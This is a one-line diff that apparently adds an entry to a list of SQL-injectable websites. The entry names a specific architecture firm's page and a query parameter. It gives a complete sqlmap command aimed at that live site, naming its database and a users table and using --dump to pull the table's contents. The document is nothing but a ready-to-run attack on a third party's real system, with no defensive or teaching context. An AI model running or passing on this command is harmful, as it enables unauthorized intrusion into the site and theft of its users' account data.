@@ -1,0 +1,1 @@
+http://www.cromarquitetura.com.br/projetosdetalhe.asp?idprojeto=8 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.cromarquitetura.com.br/projetosdetalhe.asp?idprojeto=8 -D cromarquitetur -T usuusuarios --dump
